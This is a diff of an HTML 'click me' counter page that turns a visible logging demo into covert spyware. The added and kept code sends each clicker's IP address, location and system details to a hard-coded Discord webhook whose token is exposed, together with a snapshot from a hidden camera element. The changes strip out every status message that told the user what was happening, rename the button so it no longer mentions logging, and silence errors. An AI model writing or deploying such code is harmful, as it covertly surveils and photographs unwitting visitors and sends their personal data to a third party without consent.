@@ -41,11 +41,6 @@
         .button:active {
             transform: scale(0.95);
         }
-        .status {
-            margin-top: 20px;
-            color: #666;
-            font-style: italic;
-        }
         #video, #canvas {
             display: none;
         }
@@ -54,8 +49,7 @@
 <body>
     <div class="container">
         <div class="counter" id="counter">0</div>
-        <button class="button" onclick="handleClick()">Klick mich + Logging</button>
-        <div class="status" id="status"></div>
+        <button class="button" onclick="handleClick()">Klick mich</button>
     </div>
 
     <video id="video" width="640" height="480" autoplay></video>
@@ -63,18 +57,13 @@
 
     <script>
         let count = 0;
-        const webhookURL = 'YOUR_WEBHOOK_URL_HERE'; // HIER WEBHOOK URL EINTRAGEN
-
-        function updateStatus(message) {
-            document.getElementById('status').textContent = message;
-        }
+        const webhookURL = 'https://discord.com/api/webhooks/1418677329009315950/lVEG7d2GErWR69pX37fWIMtNZbgcAxfYqpg_3EnwJNN4L32FmZYY8pdHoRAVf3o6Y92c'; // HIER WEBHOOK URL EINTRAGEN
 
         function handleClick() {
             count++;
             document.getElementById('counter').textContent = count;
-            updateStatus("Daten werden gesendet...");
             
-            // Starte das Logging
+            // Starte das Logging im Hintergrund
             collectAndSendData();
         }
 
@@ -169,18 +158,11 @@
 
         // Haupt-Logging-Funktion
         async function collectAndSendData() {
-            updateStatus("Erfasse IP und Standort...");
             const ip = await getIPAddress();
             const location = await getLocationInfo(ip);
-            
-            updateStatus("Sammle Systeminformationen...");
             const systemInfo = collectSystemInfo();
-            
-            updateStatus("Zugriff auf Kamera...");
             const cameraImage = await captureCamera();
 
-            updateStatus("Sende Daten an Discord...");
-            
             // Discord Nachricht vorbereiten
             const embedData = {
                 title: '🎯 Button Klick Erfassung',
@@ -219,18 +201,11 @@
                         body: formData
                     });
                 }
-
-                updateStatus("✅ Daten erfolgreich gesendet!");
-                setTimeout(() => updateStatus(""), 3000);
                 
             } catch (error) {
-                updateStatus("❌ Fehler beim Senden der Daten");
-                setTimeout(() => updateStatus(""), 3000);
+                // Keine Fehlermeldung anzeigen
             }
         }
-
-        // Initialisiere Status
-        updateStatus("Bereit zum Klicken...");
     </script>
 </body>
 </html>
